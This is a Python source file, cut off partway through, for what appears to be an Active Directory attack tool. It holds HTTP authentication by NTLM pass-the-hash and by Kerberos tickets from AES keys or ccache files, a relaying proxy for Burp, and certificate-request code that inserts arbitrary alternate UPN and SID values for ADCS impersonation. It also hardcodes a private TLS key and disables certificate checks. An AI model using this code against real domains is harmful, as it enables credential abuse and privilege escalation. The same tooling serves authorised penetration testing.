#!/usr/bin/python3

##########################################################
#                     Dependencies                       #
##########################################################

# PROTOCOL IMPLEMENTATION = HTTP
import requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ADDITIONAL PROTOCOLS = NTLM/SPNEGO/Kerberos/LDAP/Errors
from requests_ntlm import HttpNtlmAuth
from Utils.SPNEGO import SPNEGOUtil
from Utils.KERBEROS import KerberosUtil
from Utils.LDAP import LDAPUtil
from Utils.Errors import ErrorsUtil

# Others
import json, binascii, base64, enum, traceback, re, sys, xml.etree.ElementTree as ET, time, random, datetime, zlib, codecs, uuid, socket, ssl, threading, os
import pandas as dp
from tabulate import tabulate
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding as paddingASYM
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.hashes import SHA1
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography import x509
from asn1crypto import cms as asn1cms, core as asn1core, csr as asn1csr, x509 as asn1x509
from requests_toolbelt.multipart import decoder
from pyasn1.codec.der.decoder import decode
from pyasn1_modules import rfc5652

#####################################################
#                     Session                       #
#####################################################

BUFFER_SIZE = 4096
DST_SOCKET = None
SRV_SOCKET = None
STOP_EVENT = False
TARGET_HOST = None
TARGET_PORT = None
sslCert = '''-----BEGIN CERTIFICATE-----
MIIFazCCA1OgAwIBAgIUG3Y/N+u4VWeCrio18udhm0Y7UnQwDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDA4MTcwNDI4MzVaFw0yNTA4
MTcwNDI4MzVaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
AQUAA4ICDwAwggIKAoICAQC/YWhftscXODVentz1ma5Be2XnoeB+Yf4NLvROP6TS
/neLkLqrzNnT/ZO1kH1lD6Ps7ivwv1L2Tv3CWbNWFmA3u2B0gV+YU66yeMG8Qcgg
9PH5OIxP88tstlxIJMC0xywuLXpjSHRFKDQJuOftX7pacd+Vs4Q/gZSRLlBLK6PQ
/WQXu/DvUvafjTjEpIa7tIVLnbqUTuuOs0vUoGp5URVUtXkvIAJFok2ix4TyJZZy
sM5xt5MK4fbroglVbr2N32wrNcwGsXoAFhuBuwWU1r5fcvBO1LyFD/Ykah8FDuo/
8gaze62/XuPjeNUwloHJFbs3zDaSTVQjpbeORzpPHDF67/zqrz08Avx/GX8T6I0N
P6/0Q8eVglcBXkddC9W7NFJNMPS/ujWpfa/um35TKuvpT1Zxa2LorCLlpCydsXJ7
/YqKcLBVCNnTQdGV3miXK04EIxgLZ0zBJxC4BfR/j9eTm9f1fmfuJxfwWmH6CwY8
2y8v+7BIHKIVgGp0/FSCL4wU4UoJ36kI+lFRvTIWRGnwp/Rm4tWU0u9bcbpkluGm
6kMZkJifIGN44/Ac1s+rJzGud75ojDpUJLurz/lPnfJCty8d8gyhKg47VInrIE6+
BscXB/4K1h36V5rmPnEd+7ghAYM7Yh1wKAWzkqwBFCbOpWonuTMWpx8zsV347a17
xQIDAQABo1MwUTAdBgNVHQ4EFgQUm162tQgFY3JjulPycuu0hdx8zyYwHwYDVR0j
BBgwFoAUm162tQgFY3JjulPycuu0hdx8zyYwDwYDVR0TAQH/BAUwAwEB/zANBgkq
hkiG9w0BAQsFAAOCAgEAlxCmfaY/MDAVRDND3ai/tz3WLRQEZy9R2iWiBrVOqabO
zyKRoXE5V1eyW6OXEJ5JYDAImlYs8COVmFaaRzl7mrH23Povz+ONVpnkYTFOjBlO
Czvq+rKIoW9SBYM85wHhOHc44uzVL+fv34bJu//+3V8ZGhuuNlhKFkZkRU1yhrSB
zXlJy58oa97hNenxpnXZlAYJq32r6TEP0YbdjXQrKXPO+nqY3X7m2qHKyB6ipZYV
J+vtXuq04AdzDG1oHGF/WEheZJS3pOwQxsZjxR+GcXSjxXPWkwch1BZXH2u697l4
f5bxCtgboGZjdMAKuSjNeu/1m+3o9kple456U1G7ZIPp8eIH1slTVXPFqvgEXW/r
4WqBNLGRkfR7xsj3lPga0IU8nWWLbElE8Mmm+gr3ldydIteTXZgrj3DKNua/A5MQ
ql8Uq1Gh1avA7cMnRFRhudz2B7H/lXsVYmdeJi9rZYdiTie3J9iyVAqqWVc2gk1m
sKLpYOqLbUIrOdsf/3dRj7X6RnDLnNlhP5pIbDIT0Cb2RuKRV/W6YU4v3YWiF0XH
gd78aNrw8DreAd5P9Uj6pgSzxtUFE4diWulAccDCFWGxJe/pfiNDD+4I7EJTrqHy
SP3tCfdMRjlmuPrOc98F7wrjd7eohhWFDJGx4Q1dHissRU1NemXUV4i8kAdwzxA=
-----END CERTIFICATE-----'''
sslKey = '''-----BEGIN PRIVATE KEY-----
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
aUEg6QWenzVKGDu459Jh4GgOvK/kqg==
-----END PRIVATE KEY-----'''

def handleClient(cSocket):
	try:
		request = cSocket.recv(BUFFER_SIZE).decode('utf-8')

		if request.startswith('CONNECT'):
			handleHTTPSRequest(cSocket, request)
		else:
			handleHTTPRequest(cSocket, request)
	except:
		pass
	finally:
		cSocket.close()

def handleHTTPSRequest(cSocket, request):
	match = re.match(r'CONNECT (\S+):(\d+) HTTP/1.1', request)
	if match:
		host, port = match.groups()
		port = int(port)

		global DST_SOCKET
		if DST_SOCKET is not None:
			dSocket = DST_SOCKET
		else:
			dSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			dSocket.connect((host, port))
			cContext = ssl.create_default_context()
			cContext.check_hostname = False
			cContext.verify_mode = ssl.CERT_NONE
			dSocket = cContext.wrap_socket(dSocket, server_hostname=host)
			DST_SOCKET = dSocket

		cSocket.send(b"HTTP/1.1 200 Connection Established\r\n\r\n")

		sContext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
		global sslCert, sslKey
		with open("server.key", "w+") as f:
			f.write(sslKey)
		with open("server.crt", "w+") as f:
			f.write(sslCert)
		sContext.load_cert_chain(certfile = "server.crt", keyfile = "server.key")
		cSocket = sContext.wrap_socket(cSocket, server_side = True)

		# Relay data
		relayData(cSocket, dSocket)
	else:
		cSocket.send(b"HTTP/1.1 400 Bad Request\r\n\r\n")

def handleHTTPRequest(cSocket, request):
	lines = request.split("\r\n")
	if len(lines) > 0:
		match = re.match(r'GET (https?://)?([^:/]+)(?::(\d+))?(\S*) HTTP/1.1', lines[0])
		if match:
			scheme, host, port, _ = match.groups()
			port = int(port) if port else 80
			if not scheme:
				scheme = 'http'

			global DST_SOCKET
			if DST_SOCKET != None:
				dSocket = DST_SOCKET
			else:
				dSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				dSocket.connect((host, port))
				DST_SOCKET = dSocket
			
			dSocket.send(request.encode('utf-8'))
			response = recData(dSocket)
			cSocket.send(response)

			relayData(cSocket, dSocket)
		else:
			cSocket.send(b"HTTP/1.1 400 Bad Request\r\n\r\n")
	else:
		cSocket.send(b"HTTP/1.1 400 Bad Request\r\n\r\n")

def relayData(cSocket, dSocket):
	while True:
		cData = cSocket.recv(BUFFER_SIZE)
		if not cData:
			break
		dSocket.send(cData)
		
		dData = dSocket.recv(BUFFER_SIZE)
		if not dData:
			break
		cSocket.send(dData)

def recData(sock):
	data = b""
	headers = b""

	# Read headers
	while b"\r\n\r\n" not in headers:
		chunk = sock.recv(BUFFER_SIZE)
		if not chunk:
			break
		headers += chunk

	data += headers

	# Decode headers
	headerText = headers.decode('iso-8859-1')  # safer for raw HTTP headers
	headerLines = headerText.split("\r\n")
	contentLength = None
	chunked = False

	for line in headerLines:
		if line.lower().startswith("content-length:"):
			contentLength = int(line.split(":")[1].strip())
		elif line.lower().startswith("transfer-encoding:") and "chunked" in line.lower():
			chunked = True

	bodyStart = headers.find(b"\r\n\r\n") + 4
	body = headers[bodyStart:]

	# Read body based on Content-Length
	if contentLength is not None:
		toRead = contentLength - len(body)
		while toRead > 0:
			chunk = sock.recv(min(BUFFER_SIZE, toRead))
			if not chunk:
				break
			body += chunk
			toRead -= len(chunk)
		data = headers[:bodyStart] + body

	# OR handle chunked transfer encoding
	elif chunked:
		body = b""
		while True:
			# Read chunk size line
			line = b""
			while b"\r\n" not in line:
				chunk = sock.recv(1)
				if not chunk:
					break
				line += chunk
			chunkSize = int(line.strip(), 16)
			if chunkSize == 0:
				# Read the trailing CRLF and footer (optional)
				sock.recv(2) # Consume last CRLF
				break
			# Read chunk and trailing CRLF
			chunkData = b""
			while len(chunkData) < chunkSize:
				chunkData += sock.recv(chunkSize - len(chunkData))
			sock.recv(2) # Consume CRLF
			body += chunkData
		data = headers + body

	# Fallback — read until socket closes
	else:
		while True:
			chunk = sock.recv(BUFFER_SIZE)
			if not chunk:
				break
			data += chunk

	return data

def startProxy(host, port):
	sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sSocket.bind((host, int(port)))
	sSocket.listen(socket.SOMAXCONN)
	sSocket.setblocking(False)
	global SRV_SOCKET, STOP_EVENT
	SRV_SOCKET = sSocket

	try:
		while True:
			try:
				cSocket, _ = sSocket.accept()
				cThread = threading.Thread(target = handleClient, args = (cSocket,))
				cThread.start()
			except BlockingIOError:
				if STOP_EVENT:
					return
				time.sleep(0.01)
				continue
	except:
		sSocket.close()

def _get_certificate_hash(certificate_der: bytes) -> bytes | None:
	from cryptography.hazmat.primitives import hashes
	cert = x509.load_der_x509_certificate(certificate_der, default_backend())
	try:
		hash_algorithm = cert.signature_hash_algorithm
	except:
		raise Exception("Failed to get signature algorithm from certificate")
	if not hash_algorithm or hash_algorithm.name in ["md5", "sha1"]:
		digest = hashes.Hash(hashes.SHA256(), default_backend())
	else:
		digest = hashes.Hash(hash_algorithm, default_backend())
	digest.update(certificate_der)
	certificate_hash_bytes = digest.finalize()

	return certificate_hash_bytes

def _get_server_cert(response: requests.Response) -> bytes | None:
	
	# Overwrited method from HttpNtlmAuth that will get HTTPS certificate from TARGET_HOST (not from response parameter)

	try:
		global TARGET_HOST, TARGET_PORT
		sock = socket.create_connection((TARGET_HOST, TARGET_PORT))
		context = ssl.create_default_context()
		context.check_hostname = False
		context.verify_mode = ssl.CERT_NONE
		sock = context.wrap_socket(sock, server_hostname = TARGET_HOST)
		cert = sock.getpeercert(True)
	except AttributeError:
		pass
	except:
		raise Exception("Failed to get target server HTTPS certificate for Channel Binding")

	return _get_certificate_hash(cert)

class CustomSession(requests.Session):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.authenticated = False
		self.authType = None

	def send(self, request, **kwargs):
		if self.authType == "KERBEROS":
			if not self.authenticated:
				# Perform a first request and verify that server accepts Kerberos authentication
				res = requests.get(request.url, headers = None, verify = False)
				headerAuthenticate = res.headers.get("WWW-Authenticate")
				if headerAuthenticate == None or not headerAuthenticate.startswith('Negotiate'):
					raise Exception("Kerberos authentication not supported by the server")
				else:
					res = super().send(request, **kwargs)
					self.authenticated = True
					return res
			else:
				# After Kerberos authentication remove the "Authorization: Negotiate" header
				authorization = request.headers.get("Authorization")
				if authorization != None and authorization.startswith('Negotiate'):
					_ = request.headers.pop("Authorization", None)
				return super().send(request, **kwargs)
		else: # requests_ntlm should handle NTLM authentication
			return super().send(request, **kwargs)
		
def httpKerberosLogin(session, target, username, domain, aesKey, ccache, channelBinding):
	clientServiceSessionKey = None
	cipher = None
	ST = None

	if channelBinding:
		if channelBinding:
			if target.startswith('http://'):
				print("[-] Channel Binding requires HTTPS URI", file = sys.stderr)
				return False
			else:
				print("[+] Channel Binding requested for Kerberos but not implemented")
				print("\t[+] HTTP Server will accept authentication anyway")
	
	target = target.split('://')[1].lower()

	foundST = False
	if ccache != None: # Is there a valid ST ?
		ticket = KerberosUtil.CCache.loadFile(ccache)
		sName = f'http/{target}'
		sRealm = domain.lower()
		for creds in ticket.credentials:
			ccServiceName = creds['server'].prettyPrint().split(b'@')[0].decode('utf-8')
			ccServiceRealm = creds['server'].prettyPrint().split(b'@')[1].decode('utf-8')
			if sName == ccServiceName.lower() and sRealm == ccServiceRealm.lower(): # Found a valid ST
				foundST = True
				rawTicket = creds.toTGSREP()
				decodedTGSREP = KerberosUtil.decoder.decode(rawTicket['KDC_REP'], asn1Spec = KerberosUtil.TGS_REP())[0]
				clientServiceSessionKey = rawTicket['sessionKey'].contents
				cipher = rawTicket['cipher']
				ST = KerberosUtil.TicketObj()
				ST.from_asn1(decodedTGSREP['ticket'])
				break

	if not foundST: # No, request It with aesKey or ccache
		print("[+] No required ST available for Kerberos authentication")
		print(f"[+] Requesting HTTP/{target} to {domain.upper()}")
		try:
			tgsRep, cipher, _, clientServiceSessionKey = KerberosUtil.requestST(domain, username, '', domain, '', aesKey, ccache, None, None, None, f"HTTP/{target}", None, None, False, False, False, None, True, skipIntro = True)
			decodedTGSREP = KerberosUtil.decoder.decode(tgsRep, asn1Spec = KerberosUtil.TGS_REP())[0]
			ST = KerberosUtil.TicketObj()
			ST.from_asn1(decodedTGSREP['ticket'])
		except Exception as e:
			return False

	# Now connect to HTTP with ST

	# Build AP-REQ: Ticket and Authenticator

	apReq = KerberosUtil.AP_REQ()
	apReq['pvno'] = 5
	apReq['msg-type'] = int(KerberosUtil.ApplicationTagNumbers.AP_REQ.value)
	opts = []
	apReq['ap-options'] = KerberosUtil.encodeFlags(opts)
	KerberosUtil.seq_set(apReq, 'ticket', ST.to_asn1)
	authenticator = KerberosUtil.Authenticator()
	authenticator['authenticator-vno'] = 5
	authenticator['crealm'] = domain
	userPrincipal = KerberosUtil.PrincipalObj(username, type = KerberosUtil.PrincipalNameType.NT_PRINCIPAL.value)
	KerberosUtil.seq_set(authenticator, 'cname', userPrincipal.components_to_asn1)
	now = datetime.datetime.utcnow()
	authenticator['cusec'] = now.microsecond
	authenticator['ctime'] = KerberosUtil.KerberosTimeObj.to_asn1(now)
	encodedAuthenticator = KerberosUtil.encoder.encode(authenticator)
	KEYUSAGE = 11
	encryptedEncodedAuthenticator = cipher.encrypt(clientServiceSessionKey, KEYUSAGE, None, encodedAuthenticator)
	apReq['authenticator'] = KerberosUtil.noValue
	apReq['authenticator']['etype'] = cipher.encType
	apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
	encodedApReq = KerberosUtil.encoder.encode(apReq)

	# SPNEGO

	blob = SPNEGOUtil.SPNEGO_NegTokenInit()
	blob['MechTypes'] = [SPNEGOUtil.TypesMech['MS KRB5 - Microsoft Kerberos 5']]
	blob['MechToken'] = encodedApReq

	# HTTP

	session.headers.update({'Authorization': 'Negotiate {}'.format(base64.b64encode(blob.getData()).decode())})
	return True

def getSession(target, proxy, upstreamProxy, username, password, domain, ntHash, aesKey, ccache, channelBinding):
	print_yellow("[*] Building HTTP session")
	print_yellow("---")
	print()

	# HTTP Signing
	# 	Not supported by HTTP protocol
	# Channel Binding
	# 	Supported but only implemented with NTLM. Will work anyway with Kerberos despite EPA enforced

	try:
		session = CustomSession()

		global SRV_SOCKET, TARGET_HOST, TARGET_PORT
		match = re.match(r"https?://([a-zA-Z0-9.-]+)(?::(\d+))?", target)
		if match:
			TARGET_HOST, TARGET_PORT = match.groups()
			if TARGET_PORT:
				TARGET_PORT = int(TARGET_PORT)
			else:
				if target.lower().startswith("https"):
					TARGET_PORT = 443
				else:
					TARGET_PORT = 80
		else:
			print(f"[-] Invalid target URI", file = sys.stderr)
			return ''

		if aesKey != None or ccache != None:
			session.authType = "KERBEROS"
			res = httpKerberosLogin(session, target, username, domain, aesKey, ccache, channelBinding)
			if res == False:
				return ''
		else:
			if channelBinding:
				if target.lower().startswith("https"):
					print("[+] Using Channel Binding")
				else:
					print("[-] Channel Binding requires HTTPS URI", file = sys.stderr)
					return ''

			if ntHash != '':
				hashes = '0' * 32 + ":" + ntHash
				auth = HttpNtlmAuth(f'{domain}\{username}', hashes, send_cbt = channelBinding)
			else:
				auth = HttpNtlmAuth(f'{domain}\{username}', password, send_cbt = channelBinding)
			session.auth = auth
		
		if proxy != None:

			# Burp as proxy initiates new TCP connection for each requests received
			# 	- NTLM authentication 3-way handshake will not be linked
			# 	- Following requests after NTLM/Kerberos authentication will not be authenticated 
			# Thus, use an upstream proxy server for Burp that will maintain TCP connection to the target server
			
			print(f"[+] Burp proxy configured to {proxy}")
			upProxyHost, upProxyPort = upstreamProxy.split(':')
			sThread = threading.Thread(target = startProxy, args = (upProxyHost, upProxyPort))
			sThread.start()
			print(f"\t[+] Upstream proxy listening on {upProxyHost}:{upProxyPort}")
			print(f"\t[+] Configure this upstream proxy to Burp for target {target}")
			print(f"\t[+] Uncheck Network > HTTP > HTTP/2 > 'Default to HTTP/2 if the server supports it' into Burp")

			if channelBinding and aesKey == None and ccache == None: # NTLM only, Channel Binding not implemented for Kerberos (but will work anyway despite EPA enforced)

				# Overwrite the HttpNtlmAuth._get_server_cert() method to return the target server certificate for Channel Binding
					
				session.auth._get_server_cert = _get_server_cert

		print("[+] HTTP session built")
		return session
	except KeyboardInterrupt:
		try:
			SRV_SOCKET.close()
		except:
			pass
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		try:
			SRV_SOCKET.close()
		except:
			pass
		return ''

######################################################
#                     Requests                       #
######################################################

def isXML(string):
	try:
		ET.fromstring(string)
		return True
	except:
		return False

def printRawResponse(response, file = sys.stdout):
	versionHTTP = {
		10: "HTTP/1.0",
		11: "HTTP/1.1"
	}
	resVer = versionHTTP[response.raw.version]
	print(f"{resVer} {response.status_code} {response.reason}", file = file)
	for header, value in response.headers.items():
		print(f"{header}: {value}", file = file)
	print(file = file)

	content_type = response.headers.get('Content-Type', '').lower()
	if 'application/json' in content_type:
		print(response.json(), file = file)
	elif 'application/xml' in content_type or 'text/xml' in content_type:
		try:
			xml_content = ET.fromstring(response.content)
			print(ET.tostring(xml_content, encoding = 'utf-8').decode('utf-8'), file = file)
		except ET.ParseError as e:
			print(response.text, file = file)
	else:
		print(response.text, file = file)

def doRequest(session, target, proxy, method, path, headers, cookies, params, jsonBody, body, fileKey, fileName, filePath):
	print_yellow("[*] Sending HTTP request")
	print_yellow("---")
	print()

	try:
		if session == '':
			print(f"[-] No HTTP session available", file = sys.stderr)
			return

		if method.upper() not in ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH']:
			print(f"[-] Invalid HTTP method '{method}'", file = sys.stderr)
			return
		else:
			method = method.upper()

		url = f"{target}{path}"

		haveJSONBody = False

		if headers != None:
			headers = {kv.split('=')[0]: kv.split('=')[1] for kv in headers.split(',')}
			session.headers.update(headers)

		if cookies != None:
			cookies = {kv.split('=')[0]: kv.split('=')[1] for kv in cookies.split(',')}
			session.cookies.update(cookies)

		if params != None:
			params = {kv.split('=')[0]: kv.split('=')[1] for kv in params.split(',')}

		if jsonBody != None:
			jsonBody = json.loads(jsonBody)
			haveJSONBody = True
		elif body != None:
			if isXML(body):
				session.headers.update({'Content-Type': 'application/xml'})
			else:
				body = {kv.split('=')[0]: kv.split('=')[1] for kv in body.split('&')}
		else:
			pass

		if fileKey != None and fileName != None and filePath != None:
			fileJson = {fileKey: (fileName, open(filePath, 'rb'))}
		else:
			fileJson = None

		if proxy != None:
			proxies = {"http": proxy, "https": proxy}
		else:
			proxies = {}

		if haveJSONBody:
			res = session.request(method, url, params = params, json = jsonBody, data = body, files = fileJson, allow_redirects = False, verify = False, proxies = proxies)
		else:
			res = session.request(method, url, params = params, data = body, files = fileJson, allow_redirects = False, verify = False, proxies = proxies)

		print("[+] Printing raw response")
		print("-------------------------")
		printRawResponse(res)

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
		return ''

##################################################
#                     ADCS                       #
##################################################

PRINCIPAL_NAME = x509.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
NTDS_CA_SECURITY_EXT = x509.ObjectIdentifier("1.3.6.1.4.1.311.25.2")
NTDS_OBJECTSID = x509.ObjectIdentifier("1.3.6.1.4.1.311.25.2.1")

szOID_RENEWAL_CERTIFICATE = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.13.1")
szOID_ENCRYPTED_KEY_HASH = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.21.21")
szOID_PRINCIPAL_NAME = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.20.2.3")
szOID_ENCRYPTED_KEY_HASH = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.21.21")
szOID_CMC_ADD_ATTRIBUTES = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.10.10.1")
szOID_NTDS_CA_SECURITY_EXT = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.25.2")
szOID_NTDS_OBJECTSID = asn1cms.ObjectIdentifier("1.3.6.1.4.1.311.25.2.1")

class EnrollmentNameValuePair(asn1core.Sequence):
	_fields = [
		("name", asn1core.BMPString),
		("value", asn1core.BMPString),
	]

def hashDigest(data, hash):
	digest = hashes.Hash(hash())
	digest.update(data)
	return digest.finalize()

def createCSR(username, altDNS = None, altUPN = None, altSID = None, key = None, keySize = 2048, subject = None, renewalCert = None, applicationPoliciesOID = None):
	if key is None:
		key = rsa.generate_private_key(public_exponent = 0x10001, key_size = keySize)

	# csr = asn1csr.CertificationRequest()
	certification_request_info = asn1csr.CertificationRequestInfo()
	certification_request_info["version"] = "v1"
	# csr = x509.CertificateSigningRequestBuilder()

	if subject:
		subject_name = x509.Name(x509.Name.from_rfc4514_string(subject).rdns[::-1])
	else:
		subject_name = x509.Name([x509.NameAttribute(x509.NameOID.COMMON_NAME, username.capitalize())])

	certification_request_info["subject"] = asn1csr.Name.load(subject_name.public_bytes())
	public_key = key.public_key().public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
	subject_pk_info = asn1csr.PublicKeyInfo.load(public_key)
	certification_request_info["subject_pk_info"] = subject_pk_info
	cri_attributes = []
	if altDNS or altUPN:
		general_names = []

		if altDNS:
			if type(altDNS) == bytes:
				altDNS = altDNS.decode()
			general_names.append(asn1x509.GeneralName({"dns_name": altDNS}))

		if altUPN:
			if type(altUPN) == bytes:
				altUPN = altUPN.decode()
			general_names.append(asn1x509.GeneralName({"other_name": asn1x509.AnotherName({"type_id": szOID_PRINCIPAL_NAME, "value": asn1x509.UTF8String(altUPN).retag({"explicit": 0})})}))

		san_extension = asn1x509.Extension({"extn_id": "subject_alt_name", "extn_value": general_names})
		set_of_extensions = asn1csr.SetOfExtensions([[san_extension]])
		cri_attribute = asn1csr.CRIAttribute({"type": "extension_request", "values": set_of_extensions})
		cri_attributes.append(cri_attribute)

	if altSID:
		if type(altSID) == str:
			altSID = altSID.encode()
		san_extension = asn1x509.Extension({"extn_id": "security_ext", "extn_value": [asn1x509.GeneralName({"other_name": asn1x509.AnotherName({"type_id": szOID_NTDS_OBJECTSID, "value": asn1x509.OctetString(altSID).retag({"explicit": 0})})})]})
		set_of_extensions = asn1csr.SetOfExtensions([[san_extension]])
		cri_attribute = asn1csr.CRIAttribute({"type": "extension_request", "values": set_of_extensions})
		cri_attributes.append(cri_attribute)

	if renewalCert:
